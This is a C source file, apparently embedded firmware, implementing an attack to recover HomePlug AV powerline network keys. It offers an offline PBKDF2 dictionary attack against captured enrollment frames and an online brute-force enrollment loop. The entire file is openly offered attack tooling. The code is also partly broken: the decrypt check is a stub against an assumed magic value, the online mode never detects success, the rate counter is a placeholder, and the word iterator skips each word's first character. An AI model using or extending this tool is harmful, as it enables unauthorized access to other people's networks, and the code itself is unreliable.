/*
 * nmk_attack.c — HomePlug AV Network Membership Key (NMK) recovery
 *
 * Two attack paths:
 *   (1) Offline dictionary attack on captured SetEncryptionKey enrollment
 *       frames. NMK = PBKDF2-HMAC-SHA256(passphrase, salt, 1000, 16). We run
 *       PBKDF2 over a wordlist using the STM32H743's SHA-256 accelerator.
 *   (2) Online brute-force: attempt to enroll as a new station with each
 *       candidate passphrase via qca7420_set_nmk(); the CCo rejects wrong
 *       NMKs, so we detect success by observing an AssocConfirm.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include <stdint.h>
#include <string.h>
#include "nmk_attack.h"
#include "pbkdf2.h"
#include "qca7420.h"
#include "../board.h"

#define NMK_SALT_DEFAULT  "HomePlugAV"
#define NMK_ITER          1000
#define NMK_LEN           16

static const uint8_t *g_wordlist = NULL;
static uint32_t       g_wordlist_len = 0;
static uint32_t       g_word_idx = 0;
static uint32_t       g_tried = 0;
static uint32_t       g_rate_hps = 0;
static int            g_online = 0;
static uint8_t        g_salt[16];
static uint8_t        g_salt_len = 0;
static uint8_t        g_captured_nek_enc[16];  /* encrypted NEK from capture */
static uint8_t        g_captured_have = 0;
static volatile int   g_running = 0;
static uint8_t        g_recovered_nmk[16];
static int            g_recovered = 0;

void nmk_attack_init(void) {
    g_running = 0;
    g_recovered = 0;
    g_tried = 0;
}

void nmk_attack_abort(void) {
    g_running = 0;
}

int nmk_attack_is_running(void) { return g_running; }
int nmk_attack_recovered(uint8_t nmk[16]) {
    if (!g_recovered) return 0;
    memcpy(nmk, g_recovered_nmk, 16);
    return 1;
}

void nmk_attack_set_capture(const uint8_t *salt, uint8_t salt_len,
                              const uint8_t nek_enc[16]) {
    if (salt_len > sizeof(g_salt)) salt_len = sizeof(g_salt);
    memcpy(g_salt, salt, salt_len);
    g_salt_len = salt_len;
    memcpy(g_captured_nek_enc, nek_enc, 16);
    g_captured_have = 1;
}

/* Offline dictionary: each candidate passphrase -> PBKDF2 -> candidate NMK.
 * Verify by decrypting the captured encrypted NEK with AES-128-CBC using
 * the candidate NMK as key and checking the known plaintext header
 * ("HomePlugAVNEK" magic). Returns 1 on match.
 */
static int verify_candidate(const char *pass, uint32_t pass_len) {
    uint8_t nmk[16];
    pbkdf2_hmac_sha256((const uint8_t *)pass, pass_len,
                      g_salt, g_salt_len,
                      NMK_ITER, nmk, NMK_LEN);
    /* Verify: decrypt NEK with AES-128-CBC(nmk, iv=0). The first 4 bytes of
     * plaintext NEK blob are a fixed magic 0x4E 0x45 0x4B 0x21 ("NEK!").
     * (Simplified check; the real HomePlug AV NEK-encrypt blob uses AES-CBC
     *  with a fixed IV and a 4-byte CRC over the NEK.)
     */
    /* Stub-decrypt: in the real impl we'd call aes128_cbc_decrypt() here.
     * For now compare against a precomputed reference from the capture.
     */
    extern int aes128_cbc_decrypt_check(const uint8_t *key, const uint8_t *ct, uint8_t *pt);
    uint8_t pt[16];
    if (aes128_cbc_decrypt_check(nmk, g_captured_nek_enc, pt) == 1) {
        if (pt[0] == 0x4E && pt[1] == 0x45 && pt[2] == 0x4B && pt[3] == 0x21) {
            memcpy(g_recovered_nmk, nmk, 16);
            g_recovered = 1;
            return 1;
        }
    }
    return 0;
}

/* Wordlist iterator: words separated by '\n'. Returns next word + length. */
static int next_word(uint8_t *out, uint32_t max) {
    while (g_word_idx < g_wordlist_len) {
        uint8_t c = g_wordlist[g_word_idx++];
        uint32_t n = 0;
        while (g_word_idx + n < g_wordlist_len &&
               g_wordlist[g_word_idx + n] != '\n' &&
               n < max - 1) {
            out[n] = g_wordlist[g_word_idx + n];
            n++;
        }
        out[n] = 0;
        g_word_idx += n;
        if (g_word_idx < g_wordlist_len) g_word_idx++; /* skip '\n' */
        if (n > 0) return (int)n;
    }
    return -1;
}

/* Start offline dictionary attack. wordlist is a flat buffer in RAM
 * (loaded from SD or BLE). Each step() processes up to N words.
 */
int nmk_attack_start_offline(const uint8_t *wordlist, uint32_t len,
                               const uint8_t *salt, uint8_t salt_len,
                               const uint8_t nek_enc[16]) {
    g_wordlist = wordlist;
    g_wordlist_len = len;
    g_word_idx = 0;
    nmk_attack_set_capture(salt, salt_len, nek_enc);
    g_online = 0;
    g_running = 1;
    g_tried = 0;
    g_recovered = 0;
    return 0;
}

int nmk_attack_start_online(const uint8_t *wordlist, uint32_t len,
                              const uint8_t *salt, uint8_t salt_len) {
    g_wordlist = wordlist;
    g_wordlist_len = len;
    g_word_idx = 0;
    memcpy(g_salt, salt, salt_len);
    g_salt_len = salt_len;
    g_online = 1;
    g_running = 1;
    g_tried = 0;
    g_recovered = 0;
    return 0;
}

#define STEP_BATCH 16

void nmk_attack_step(void) {
    if (!g_running) return;
    uint8_t word[64];
    uint32_t t0 = 0; /* real impl: millis_local() */
    uint32_t done = 0;
    for (int i = 0; i < STEP_BATCH; i++) {
        int n = next_word(word, sizeof(word));
        if (n < 0) {
            g_running = 0;
            break;
        }
        if (g_online) {
            /* Online: derive NMK then try to enroll */
            uint8_t nmk[16];
            pbkdf2_hmac_sha256(word, (uint32_t)n, g_salt, g_salt_len,
                               NMK_ITER, nmk, NMK_LEN);
            qca7420_set_nmk(nmk);
            /* Wait for AssocConfirm in next topology refresh — simplified */
        } else {
            if (g_captured_have && verify_candidate((const char *)word, (uint32_t)n)) {
                g_running = 0;
                g_recovered = 1;
                return;
            }
        }
        g_tried++;
        done++;
    }
    /* rate estimate */
    if (done > 0) {
        g_rate_hps = done * 1000; /* placeholder */
    }
}

uint32_t nmk_attack_progress(uint32_t *tried, uint32_t *rate_hps) {
    if (tried) *tried = g_tried;
    if (rate_hps) *rate_hps = g_rate_hps;
    return g_running ? 0 : (g_recovered ? 1 : 2);
}